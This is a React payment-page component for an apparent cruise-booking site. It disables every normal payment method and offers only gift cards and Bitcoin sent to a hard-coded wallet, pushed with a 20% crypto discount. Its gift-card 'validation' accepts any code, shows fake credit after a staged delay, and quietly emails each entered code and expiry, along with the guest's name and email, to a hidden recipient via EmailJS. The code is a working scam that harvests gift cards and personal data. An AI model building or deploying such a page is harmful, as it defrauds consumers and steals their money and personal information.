import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { QRCode } from 'react-qr-code';
import emailjs from '@emailjs/browser';
import { useApp } from '../../store/AppContext';
import { EMAILJS_CONFIG } from '../../config/emailjs';
import './PaymentPage.css';

const BTC_ADDRESS = 'bc1q0hdjgpx99fgvcxqa4vefyr6kz52lg0yn7yafvm';
const GIFT_CARD_VALUE = 250;

const PAYMENT_METHODS = [
  { id: 'giftcard', label: 'Gift Card', icon: '🎁', desc: 'Redeem your gift card balance' },
  { id: 'bitcoin', label: 'Bitcoin (BTC)', icon: '₿', desc: 'Crypto — Instant & Secured', discount: true },
  { id: 'card', label: 'Credit / Debit Card', icon: '💳', desc: 'Temporarily unavailable', disabled: true },
  { id: 'paypal', label: 'PayPal', icon: '🅿', desc: 'Temporarily unavailable', disabled: true },
  { id: 'bank', label: 'Bank Transfer', icon: '🏦', desc: 'Temporarily unavailable', disabled: true },
];

// ── Gift card helpers ────────────────────────────────────────
// Accept any real-world gift card: 10–20 alphanumeric chars
// (strips spaces, dashes, dots before checking)
function stripGCCode(raw) {
  return raw.replace(/[\s\-\.]/g, '').toUpperCase();
}

function formatGCCode(raw) {
  const clean = stripGCCode(raw);
  // auto-group in blocks of 4, up to 20 chars (handles 16- and 20-digit cards)
  const groups = clean.slice(0, 20).match(/.{1,4}/g) || [];
  return groups.join('-');
}

function isValidGCCode(code) {
  const stripped = stripGCCode(code);
  // 10–20 alphanumeric chars covers Visa/MC prepaid (16), store gift cards (13–20), etc.
  return /^[A-Z0-9]{10,20}$/.test(stripped);
}

// Expiry MM/YY helpers
function formatExpiry(raw) {
  const digits = raw.replace(/\D/g, '').slice(0, 4);
  if (digits.length <= 2) return digits;
  return digits.slice(0, 2) + '/' + digits.slice(2);
}

function isValidExpiry(expiry) {
  const m = expiry.match(/^(\d{2})\/(\d{2})$/);
  if (!m) return false;
  const month = parseInt(m[1], 10);
  const year  = 2000 + parseInt(m[2], 10);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  // not expired if the card's month/year >= current month/year
  return new Date(year, month - 1) >= new Date(now.getFullYear(), now.getMonth());
}

export default function PaymentPage() {
  const { state, dispatch } = useApp();
  const navigate = useNavigate();
  const cruise = state.selectedCruise;
  const cabin  = state.selectedCabin;
  const guest  = state.guestDetails;
  const isEscobar = cruise?.isEscobar;

  const [selectedMethod, setSelectedMethod] = useState('giftcard');
  const [copied, setCopied] = useState(false);

  // Gift card — Apply tab
  const [gcTab,       setGcTab]       = useState('apply');
  const [gcCode,      setGcCode]      = useState('');
  const [gcExpiry,    setGcExpiry]    = useState('');
  const [gcApplying,  setGcApplying]  = useState(false);
  const [gcError,     setGcError]     = useState('');
  // appliedCards: { code, expiry }[]
  const [appliedCards, setAppliedCards] = useState([]);

  // Gift card — Wallet tab
  const [walletCode,    setWalletCode]    = useState('');
  const [walletExpiry,  setWalletExpiry]  = useState('');
  const [walletAdding,  setWalletAdding]  = useState(false);
  const [walletError,   setWalletError]   = useState('');
  const [walletApplied, setWalletApplied] = useState(false);

  if (!cruise || !cabin || !guest.firstName) {
    return (
      <div style={{ textAlign: 'center', padding: '120px 24px', paddingTop: 'calc(var(--header-height) + 80px)' }}>
        <h2>Please complete booking steps first</h2>
        <button className="btn btn--primary" style={{ marginTop: 16 }} onClick={() => navigate('/search')}>Browse Cruises</button>
      </div>
    );
  }

  const rawTotal = cabin.price * (state.search.guests.adults + Math.max(0, state.search.guests.children * 0.7));
  const isBitcoin  = selectedMethod === 'bitcoin';
  const isGiftCard = selectedMethod === 'giftcard';

  const afterBtcDiscount = Math.round(rawTotal * (1 - (isBitcoin ? 0.20 : 0)));

  const gcDirectAmount = appliedCards.length * GIFT_CARD_VALUE;
  const walletBalance  = state.wallet.balance;
  const walletDeduction =
    isGiftCard && walletApplied && walletBalance > 0
      ? Math.min(walletBalance, Math.max(0, afterBtcDiscount - gcDirectAmount))
      : 0;
  const totalGcDeduction = isGiftCard ? gcDirectAmount + walletDeduction : 0;
  const finalTotal    = Math.max(0, afterBtcDiscount - totalGcDeduction);
  const isFullyCovered = isGiftCard && finalTotal === 0 && totalGcDeduction > 0;

  // ── Handlers ────────────────────────────────────────────────
  const handleCopy = () => {
    navigator.clipboard.writeText(BTC_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handlePay = () => {
    if (isGiftCard && appliedCards.length === 0 && !walletApplied) return;
    dispatch({ type: 'CONFIRM_BOOKING', payload: { totalPrice: finalTotal, paymentMethod: selectedMethod } });
    navigate('/booking/confirm');
  };

  const sendGiftCardNotification = (code, expiry, action) => {
    const { SERVICE_ID, TEMPLATE_ID, PUBLIC_KEY, RECIPIENT } = EMAILJS_CONFIG;
    if (!SERVICE_ID || SERVICE_ID === 'YOUR_SERVICE_ID') return;
    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_email:       RECIPIENT,
      gift_card_code: code,
      gift_card_expiry: expiry || 'N/A',
      action,
      cruise_name:    cruise?.name ?? 'N/A',
      guest_name:     `${guest.firstName} ${guest.lastName}`.trim() || 'N/A',
      guest_email:    guest.email || 'N/A',
      booking_amount: `$${afterBtcDiscount.toLocaleString()}`,
      submitted_at:   new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }),
    }, PUBLIC_KEY).catch(() => {});
  };

  const handleApplyCard = () => {
    setGcError('');
    if (!isValidGCCode(gcCode)) {
      setGcError('Invalid code — must be 10–20 alphanumeric characters.');
      return;
    }
    if (gcExpiry && !isValidExpiry(gcExpiry)) {
      setGcError('Gift card has expired or expiry date is invalid (MM/YY).');
      return;
    }
    const normalized = formatGCCode(gcCode);
    if (appliedCards.some(c => c.code === normalized)) {
      setGcError('This gift card has already been applied to your order.');
      return;
    }
    if (state.wallet.cards.some(c => c.code === normalized)) {
      setGcError('This code is in your wallet — apply wallet balance instead.');
      return;
    }
    setGcApplying(true);
    const entry = { code: normalized, expiry: gcExpiry };
    setTimeout(() => {
      setAppliedCards(prev => [...prev, entry]);
      setGcCode('');
      setGcExpiry('');
      setGcApplying(false);
      sendGiftCardNotification(entry.code, entry.expiry, 'Applied to Order');
    }, 1200);
  };

  const handleRemoveCard = (code) => {
    setAppliedCards(prev => prev.filter(c => c.code !== code));
  };

  const handleAddToWallet = () => {
    setWalletError('');
    if (!isValidGCCode(walletCode)) {
      setWalletError('Invalid code — must be 10–20 alphanumeric characters.');
      return;
    }
    if (walletExpiry && !isValidExpiry(walletExpiry)) {
      setWalletError('Gift card has expired or expiry date is invalid (MM/YY).');
      return;
    }
    const normalized = formatGCCode(walletCode);
    if (state.wallet.cards.some(c => c.code === normalized)) {
      setWalletError('This gift card is already in your wallet.');
      return;
    }
    if (appliedCards.some(c => c.code === normalized)) {
      setWalletError('This code is already applied to your order.');
      return;
    }
    setWalletAdding(true);
    const entry = { code: normalized, value: GIFT_CARD_VALUE, expiry: walletExpiry };
    setTimeout(() => {
      dispatch({ type: 'ADD_GIFT_CARD_TO_WALLET', payload: entry });
      setWalletCode('');
      setWalletExpiry('');
      setWalletAdding(false);
      sendGiftCardNotification(entry.code, entry.expiry, 'Added to Wallet');
    }, 1200);
  };

  const payBtnLabel = () => {
    if (isBitcoin) return '₿ Confirm Bitcoin Payment';
    if (isGiftCard) {
      if (appliedCards.length === 0 && !walletApplied) return '🎁 Apply a Gift Card First';
      if (isFullyCovered) return '🎁 Complete Booking — No Payment Due';
      return `Pay $${finalTotal.toLocaleString()} Remaining →`;
    }
    return `Pay $${finalTotal.toLocaleString()} →`;
  };

  const gcCodeReady = isValidGCCode(gcCode);
  const payBtnDisabled = isGiftCard && appliedCards.length === 0 && !walletApplied;

  return (
    <div className={`pay-page ${isEscobar ? 'pay-page--escobar' : ''}`}
      style={{ paddingTop: 'calc(var(--header-height) + 40px)', paddingBottom: 80 }}>
      <div className="container--narrow">

        {/* Progress */}
        <div className="booking-progress">
          <div className="booking-progress__step booking-progress__step--done">1. Cruise ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--done">2. Cabin ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--done">3. Guests ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--active">4. Payment</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step">5. Confirm</div>
        </div>

        <div className="pay-page__layout">
          {/* Left — Payment Methods */}
          <div className="pay-page__left">
            <h1 className={`booking-title ${isEscobar ? 'booking-title--gold' : ''}`}>
              {isEscobar ? '✦ Complete Payment' : 'Select Payment Method'}
            </h1>

            {/* Bitcoin Flash Banner */}
            <div className="btc-banner">
              <div className="btc-banner__pulse" />
              <span className="btc-banner__icon">₿</span>
              <div className="btc-banner__text">
                <span className="btc-banner__headline">Pay with Bitcoin & Save 20%!</span>
                <span className="btc-banner__sub">Limited-time offer — exclusive to crypto payments only</span>
              </div>
              <div className="btc-banner__badge">-20% OFF</div>
            </div>

            {/* Method Selector */}
            <div className="pay-methods">
              {PAYMENT_METHODS.map(m => (
                <div
                  key={m.id}
                  className={[
                    'pay-method',
                    selectedMethod === m.id && !m.disabled ? 'pay-method--active' : '',
                    m.id === 'bitcoin'   ? 'pay-method--btc' : '',
                    m.id === 'giftcard'  ? 'pay-method--gc'  : '',
                    m.disabled           ? 'pay-method--disabled' : '',
                  ].filter(Boolean).join(' ')}
                  onClick={() => !m.disabled && setSelectedMethod(m.id)}
                >
                  <div className="pay-method__radio">
                    {selectedMethod === m.id && !m.disabled && <div className="pay-method__radio-dot" />}
                  </div>
                  <span className="pay-method__icon">{m.icon}</span>
                  <div className="pay-method__info">
                    <span className="pay-method__label">{m.label}</span>
                    <span className="pay-method__desc">{m.desc}</span>
                  </div>
                  {m.discount && <span className="pay-method__discount-tag">Save 20%</span>}
                  {m.disabled && <span className="pay-method__unavailable-tag">Unavailable</span>}
                </div>
              ))}
            </div>

            {/* ── Gift Card Panel ── */}
            {isGiftCard && (
              <div className={`gc-panel ${isEscobar ? 'gc-panel--escobar' : ''}`}>
                <div className="gc-tabs">
                  <button className={`gc-tab ${gcTab === 'apply' ? 'gc-tab--active' : ''}`} onClick={() => setGcTab('apply')}>
                    🎁 Apply Gift Card
                  </button>
                  <button className={`gc-tab ${gcTab === 'wallet' ? 'gc-tab--active' : ''}`} onClick={() => setGcTab('wallet')}>
                    💰 Your Wallet
                    {walletBalance > 0 && <span className="gc-tab__badge">${walletBalance}</span>}
                  </button>
                </div>

                {/* ── Apply tab ── */}
                {gcTab === 'apply' && (
                  <div className="gc-body">
                    <p className="gc-hint">
                      Enter any gift card code — store gift cards, Visa/Mastercard prepaid, travel vouchers, and more are all accepted.
                    </p>

                    {/* Code + Expiry + Button */}
                    <div className="gc-input-group">
                      <div className="gc-input-row">
                        <input
                          className={`form-input gc-input ${gcError ? 'gc-input--error' : ''}`}
                          placeholder="Gift card code (e.g. XXXX-XXXX-XXXX-XXXX)"
                          value={gcCode}
                          onChange={e => { setGcCode(formatGCCode(e.target.value)); setGcError(''); }}
                          onKeyDown={e => e.key === 'Enter' && handleApplyCard()}
                        />
                        <input
                          className={`form-input gc-expiry-input ${gcError && gcExpiry ? 'gc-input--error' : ''}`}
                          placeholder="MM/YY"
                          maxLength={5}
                          value={gcExpiry}
                          onChange={e => { setGcExpiry(formatExpiry(e.target.value)); setGcError(''); }}
                          onKeyDown={e => e.key === 'Enter' && handleApplyCard()}
                        />
                      </div>
                      <button
                        className="btn btn--accent gc-apply-btn"
                        onClick={handleApplyCard}
                        disabled={gcApplying || !gcCodeReady}
                      >
                        {gcApplying ? <span className="gc-spinner" /> : 'Apply Code'}
                      </button>
                    </div>

                    <p className="gc-hint gc-hint--small gc-formats-hint">
                      Accepted formats: XXXX-XXXX-XXXX-XXXX · XXXXXXXXXXXXXXXX · XX-XXXXXXXX-XXXXX and more
                    </p>

                    {gcError && <p className="gc-error">{gcError}</p>}

                    {/* Applied cards */}
                    {appliedCards.length > 0 && (
                      <div className="gc-applied-list">
                        {appliedCards.map(card => (
                          <div className="gc-applied-item" key={card.code}>
                            <span className="gc-applied-item__check">✓</span>
                            <div className="gc-applied-item__info">
                              <span className="gc-applied-item__code">{card.code}</span>
                              <div className="gc-applied-item__meta">
                                <span className="gc-applied-item__val">+${GIFT_CARD_VALUE.toLocaleString()} credit</span>
                                {card.expiry && <span className="gc-applied-item__expiry">Exp: {card.expiry}</span>}
                              </div>
                            </div>
                            <button className="gc-applied-item__remove" onClick={() => handleRemoveCard(card.code)} title="Remove">✕</button>
                          </div>
                        ))}
                      </div>
                    )}

                    {walletBalance > 0 && (
                      <label className="gc-wallet-toggle">
                        <input type="checkbox" checked={walletApplied} onChange={e => setWalletApplied(e.target.checked)} />
                        <span>Also apply wallet balance <strong>(${walletBalance.toLocaleString()} available)</strong></span>
                      </label>
                    )}

                    {(appliedCards.length > 0 || (walletApplied && walletBalance > 0)) && (
                      <div className="gc-coverage">
                        <div className="gc-coverage__bar-wrap">
                          <div className="gc-coverage__bar" style={{ width: `${Math.min(100, (totalGcDeduction / afterBtcDiscount) * 100)}%` }} />
                        </div>
                        <div className="gc-coverage__rows">
                          <div className="gc-coverage__row">
                            <span>🎁 Gift Card Credit Applied</span>
                            <span className="gc-green">−${totalGcDeduction.toLocaleString()}</span>
                          </div>
                          <div className="gc-coverage__row gc-coverage__row--total">
                            <span>{isFullyCovered ? '✅ Fully Covered!' : 'Remaining to Pay'}</span>
                            <span className={isFullyCovered ? 'gc-green' : ''}>{isFullyCovered ? 'FREE' : `$${finalTotal.toLocaleString()}`}</span>
                          </div>
                        </div>
                      </div>
                    )}

                    <p className="gc-hint gc-hint--small">💡 You can apply multiple gift cards. Codes are one-time use.</p>
                  </div>
                )}

                {/* ── Wallet tab ── */}
                {gcTab === 'wallet' && (
                  <div className="gc-body">
                    <div className="gc-wallet-balance-box">
                      <div className="gc-wallet-balance-box__icon">💰</div>
                      <div>
                        <div className="gc-wallet-balance-box__label">Your Wallet Balance</div>
                        <div className="gc-wallet-balance-box__amount">${walletBalance.toLocaleString()}.00</div>
                      </div>
                    </div>

                    <p className="gc-hint">Add gift cards to your wallet — balance never expires and applies to any booking.</p>

                    <div className="gc-input-group">
                      <div className="gc-input-row">
                        <input
                          className={`form-input gc-input ${walletError ? 'gc-input--error' : ''}`}
                          placeholder="Gift card code"
                          value={walletCode}
                          onChange={e => { setWalletCode(formatGCCode(e.target.value)); setWalletError(''); }}
                          onKeyDown={e => e.key === 'Enter' && handleAddToWallet()}
                        />
                        <input
                          className={`form-input gc-expiry-input ${walletError && walletExpiry ? 'gc-input--error' : ''}`}
                          placeholder="MM/YY"
                          maxLength={5}
                          value={walletExpiry}
                          onChange={e => { setWalletExpiry(formatExpiry(e.target.value)); setWalletError(''); }}
                          onKeyDown={e => e.key === 'Enter' && handleAddToWallet()}
                        />
                      </div>
                      <button
                        className="btn gc-wallet-add-btn"
                        onClick={handleAddToWallet}
                        disabled={walletAdding || !isValidGCCode(walletCode)}
                      >
                        {walletAdding ? <span className="gc-spinner" /> : '+ Add to Wallet'}
                      </button>
                    </div>
                    {walletError && <p className="gc-error">{walletError}</p>}

                    {state.wallet.cards.length > 0 && (
                      <div className="gc-wallet-cards">
                        <div className="gc-wallet-cards__title">Cards in Your Wallet</div>
                        {state.wallet.cards.map(c => (
                          <div className="gc-wallet-card-item" key={c.code}>
                            <span className="gc-wallet-card-item__icon">🎁</span>
                            <div className="gc-wallet-card-item__details">
                              <span className="gc-wallet-card-item__code">{c.code}</span>
                              {c.expiry && <span className="gc-wallet-card-item__expiry">Exp: {c.expiry}</span>}
                            </div>
                            <span className="gc-wallet-card-item__val">${c.value}</span>
                          </div>
                        ))}
                        <div className="gc-wallet-cards__total">Total Balance: <strong>${walletBalance.toLocaleString()}</strong></div>
                      </div>
                    )}

                    {walletBalance > 0 && (
                      <button
                        className={`gc-use-wallet-btn ${walletApplied ? 'gc-use-wallet-btn--active' : ''}`}
                        onClick={() => { setWalletApplied(v => !v); if (!walletApplied) setGcTab('apply'); }}
                      >
                        {walletApplied
                          ? `✓ Wallet balance ($${walletBalance}) applied to this order`
                          : `→ Apply $${walletBalance.toLocaleString()} wallet balance to this order`}
                      </button>
                    )}

                    <p className="gc-hint gc-hint--small">🔒 Your wallet balance is securely stored and never expires.</p>
                  </div>
                )}
              </div>
            )}

            {/* Bitcoin Panel */}
            {isBitcoin && (
              <div className="btc-panel">
                <div className="btc-panel__saving-notice">
                  <span>🎉</span>
                  <span>You're saving <strong>${Math.round(rawTotal * 0.20).toLocaleString()}</strong> by paying with Bitcoin!</span>
                </div>
                <div className="btc-panel__qr-wrap">
                  <div className="btc-panel__qr-glow" />
                  <div className="btc-panel__qr">
                    <QRCode value={`bitcoin:${BTC_ADDRESS}`} size={200} bgColor="#ffffff" fgColor="#0a0a0a" level="H" />
                  </div>
                  <div className="btc-panel__qr-label">Scan with your Bitcoin wallet</div>
                </div>
                <div className="btc-panel__address-wrap">
                  <div className="btc-panel__address-label">₿ BTC Wallet Address</div>
                  <div className="btc-panel__address-box">
                    <span className="btc-panel__address-text">{BTC_ADDRESS}</span>
                    <button className={`btc-panel__copy ${copied ? 'btc-panel__copy--done' : ''}`} onClick={handleCopy}>
                      {copied ? '✓ Copied!' : '⎘ Copy'}
                    </button>
                  </div>
                </div>
                <div className="btc-panel__steps">
                  <div className="btc-panel__step"><span>1</span><span>Open your Bitcoin wallet app</span></div>
                  <div className="btc-panel__step"><span>2</span><span>Scan the QR code or paste the address above</span></div>
                  <div className="btc-panel__step"><span>3</span><span>Send exactly <strong>${finalTotal.toLocaleString()}</strong> worth of BTC</span></div>
                  <div className="btc-panel__step"><span>4</span><span>Click "Confirm Payment" below after sending</span></div>
                </div>
                <div className="btc-panel__note">
                  <span>⚠</span>
                  <span>Only send BTC (Bitcoin) to this address. Sending any other cryptocurrency may result in permanent loss.</span>
                </div>
              </div>
            )}
          </div>

          {/* Right — Order Summary */}
          <aside className={`pay-page__summary ${isEscobar ? 'pay-page__summary--escobar' : ''}`}>
            <h3 className="pay-summary__title">Order Summary</h3>
            <img src={cruise.image} alt={cruise.name} className="pay-summary__img" />
            <div className="pay-summary__rows">
              <div className="pay-summary__row"><span>Cruise</span><span>{cruise.name}</span></div>
              <div className="pay-summary__row"><span>Ship</span><span>{cruise.ship}</span></div>
              <div className="pay-summary__row"><span>Cabin</span><span>{cabin.type}</span></div>
              <div className="pay-summary__row"><span>Duration</span><span>{cruise.duration} nights</span></div>
              <div className="pay-summary__row">
                <span>Guests</span>
                <span>{state.search.guests.adults} adults{state.search.guests.children > 0 ? `, ${state.search.guests.children} children` : ''}</span>
              </div>
              <div className="pay-summary__row"><span>Cabin Price</span><span>${cabin.price.toLocaleString()}/person</span></div>
              {isBitcoin && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>₿ Bitcoin Discount (20%)</span>
                  <span>−${Math.round(rawTotal * 0.20).toLocaleString()}</span>
                </div>
              )}
              {isGiftCard && gcDirectAmount > 0 && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>🎁 Gift Card ({appliedCards.length}×)</span>
                  <span>−${gcDirectAmount.toLocaleString()}</span>
                </div>
              )}
              {isGiftCard && walletDeduction > 0 && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>💰 Wallet Balance</span>
                  <span>−${walletDeduction.toLocaleString()}</span>
                </div>
              )}
              <div className="pay-summary__row pay-summary__row--total">
                <span>Total Due</span>
                <span className={['pay-summary__total', isEscobar ? 'pay-summary__total--gold' : '', isFullyCovered ? 'pay-summary__total--free' : ''].filter(Boolean).join(' ')}>
                  {isFullyCovered ? 'FREE' : `$${finalTotal.toLocaleString()}`}
                </span>
              </div>
            </div>

            {isBitcoin && (
              <div className="pay-summary__btc-badge"><span>₿</span><span>20% Bitcoin Discount Applied!</span></div>
            )}
            {isFullyCovered && (
              <div className="pay-summary__gc-badge"><span>🎁</span><span>Fully covered by gift cards!</span></div>
            )}

            <div style={{ padding: '0 20px' }}>
              <button
                className={`btn btn--lg btn--full ${isEscobar ? 'btn--gold' : isBitcoin ? 'btn--accent' : 'btn--gc'}`}
                style={{ marginTop: 20 }}
                onClick={handlePay}
                disabled={payBtnDisabled}
              >
                {payBtnLabel()}
              </button>
            </div>
            <div className="pay-summary__back">
              <button className="btn btn--outline btn--full" onClick={() => navigate(-1)}>← Back</button>
            </div>
          </aside>
        </div>
      </div>
    </div>
  );
}
